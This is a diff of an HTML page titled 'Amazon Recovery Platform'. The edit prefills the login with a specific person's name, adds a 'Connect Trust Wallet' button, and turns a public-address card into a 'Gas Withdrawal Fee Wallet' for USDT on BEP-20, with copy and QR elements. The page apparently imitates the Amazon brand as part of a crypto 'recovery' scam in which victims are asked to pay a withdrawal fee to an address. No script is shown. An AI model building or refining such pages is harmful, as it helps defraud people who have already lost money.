@@ -1,3 +1,4 @@
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -16,9 +17,7 @@
 
 <body>
 
-  <!-- =========================
-       LOGIN
-  ========================== -->
+  <!-- LOGIN -->
   <main id="loginScreen" class="login-screen">
 
     <div class="login-card">
@@ -28,24 +27,26 @@
 
         <div>
           <h1>Amazon Recovery Platform</h1>
-          <span>Secure Dashboard Access</span>
+          <span>Secure Platform Access</span>
         </div>
       </div>
 
       <div class="login-heading">
-        <h2>Welcome Back</h2>
-        <p>Enter your username to access your dashboard.</p>
+        <h2>Welcome</h2>
+        <p>Enter your username to continue.</p>
       </div>
 
       <form id="loginForm" autocomplete="off">
 
-        <label for="username">Username</label>
+        <label for="username">
+          Username
+        </label>
 
         <input
           type="text"
           id="username"
           name="username"
-          placeholder="Enter your username"
+          value="محمود الشبيلات"
           autocomplete="off"
           required
         >
@@ -65,10 +66,8 @@
   </main>
 
 
-  <!-- =========================
-       DASHBOARD
-  ========================== -->
-  <main id="dashboardScreen" class="dashboard-screen hidden">
+  <!-- PLATFORM -->
+  <main id="platformScreen" class="platform-screen hidden">
 
     <!-- HEADER -->
     <header class="top-header">
@@ -83,15 +82,19 @@
 
           <div class="brand-text">
             <strong>Amazon Recovery Platform</strong>
-            <span>Recovery Dashboard</span>
+            <span>Secure Platform</span>
           </div>
 
         </div>
 
-        <div class="status-indicator">
-          <span></span>
-          Dashboard
-        </div>
+        <button
+          type="button"
+          id="connectTrustWalletButton"
+          class="trust-button"
+        >
+          <span class="trust-dot"></span>
+          Connect Trust Wallet
+        </button>
 
       </div>
 
@@ -106,7 +109,7 @@
         <div class="hero-content">
 
           <span class="hero-tag">
-            RECOVERY PLATFORM
+            AMAZON RECOVERY PLATFORM
           </span>
 
           <h1>
@@ -115,7 +118,7 @@
           </h1>
 
           <p>
-            Manage your wallet information from your recovery dashboard.
+            Manage your wallet information from one secure platform.
           </p>
 
         </div>
@@ -123,6 +126,7 @@
         <div class="hero-decoration">
           <div class="hero-circle circle-one"></div>
           <div class="hero-circle circle-two"></div>
+
           <div class="hero-shield">
             ✓
           </div>
@@ -133,14 +137,14 @@
     </section>
 
 
-    <!-- MAIN CONTENT -->
-    <section class="dashboard-container">
+    <!-- CONTENT -->
+    <section class="platform-container">
 
       <div class="section-heading">
 
         <div>
-          <span>ACCOUNT SETTINGS</span>
-          <h2>Wallet Information</h2>
+          <span>WALLET INFORMATION</span>
+          <h2>Account Information</h2>
         </div>
 
       </div>
@@ -149,9 +153,7 @@
       <div class="wallet-grid">
 
 
-        <!-- =========================
-             CONNECT WALLET ID
-        ========================== -->
+        <!-- CONNECT WALLET ID -->
         <section class="wallet-card wallet-primary">
 
           <div class="card-top">
@@ -168,7 +170,9 @@
 
           <div class="card-content">
 
-            <h3>Connect Wallet ID</h3>
+            <h3>
+              Connect Wallet ID
+            </h3>
 
             <p>
               Enter a valid EVM wallet address.
@@ -217,9 +221,7 @@
         </section>
 
 
-        <!-- =========================
-             WITHDRAWAL WALLET
-        ========================== -->
+        <!-- WITHDRAWAL WALLET ADDRESS -->
         <section class="wallet-card">
 
           <div class="card-top">
@@ -236,7 +238,9 @@
 
           <div class="card-content">
 
-            <h3>Withdrawal Wallet Address</h3>
+            <h3>
+              Withdrawal Wallet Address
+            </h3>
 
             <p>
               Enter the public wallet address associated with withdrawals.
@@ -261,9 +265,7 @@
         </section>
 
 
-        <!-- =========================
-             PUBLIC WALLET ADDRESS
-        ========================== -->
+        <!-- GAS WITHDRAWAL FEE WALLET -->
         <section class="wallet-card address-card">
 
           <div class="card-top">
@@ -280,7 +282,9 @@
 
           <div class="card-content">
 
-            <h3>Public Wallet Address</h3>
+            <h3>
+              Gas Withdrawal Fee Wallet
+            </h3>
 
             <p>
               USDT · BEP-20 Network
@@ -297,6 +301,20 @@
 
             </div>
 
+            <button
+              type="button"
+              id="copyGasWalletButton"
+              class="copy-button"
+            >
+              Copy Wallet Address
+            </button>
+
+            <div
+              id="copyMessage"
+              class="copy-message"
+              aria-live="polite"
+            ></div>
+
             <div class="qr-section">
 
               <div
@@ -308,9 +326,10 @@
               </div>
 
               <div class="qr-info">
-                <strong>Wallet Address</strong>
+                <strong>Wallet Address QR</strong>
+
                 <span>
-                  Scan to view this public address.
+                  Scan the public wallet address.
                 </span>
               </div>
 
@@ -323,7 +342,29 @@
       </div>
 
 
-      <!-- INFORMATION PANEL -->
+      <!-- TRUST WALLET STATUS -->
+      <section class="wallet-connection-panel">
+
+        <div class="connection-icon">
+          ◇
+        </div>
+
+        <div class="connection-content">
+
+          <strong>
+            Trust Wallet Connection
+          </strong>
+
+          <p id="walletConnectionStatus">
+            No wallet connected.
+          </p>
+
+        </div>
+
+      </section>
+
+
+      <!-- SECURITY INFORMATION -->
       <section class="information-panel">
 
         <div class="info-icon">
@@ -331,11 +372,16 @@
         </div>
 
         <div>
-          <strong>Wallet information</strong>
+
+          <strong>
+            Wallet information
+          </strong>
+
           <p>
-            Only enter public wallet addresses. Never enter a private key,
-            recovery phrase, or secret credential.
+            Only enter public wallet addresses. Never enter a private key
+            or recovery phrase.
           </p>
+
         </div>
 
       </section>
@@ -344,9 +390,10 @@
 
 
     <!-- FOOTER -->
-    <footer class="dashboard-footer">
+    <footer class="platform-footer">
 
       <div class="footer-brand">
+
         <div class="brand-logo footer-logo">
           AR
         </div>
@@ -354,10 +401,11 @@
         <span>
           Amazon Recovery Platform
         </span>
+
       </div>
 
       <span class="footer-copy">
-        Wallet Dashboard
+        Secure Platform
       </span>
 
     </footer>
@@ -369,3 +417,4 @@
 
 </body>
 </html>
+```
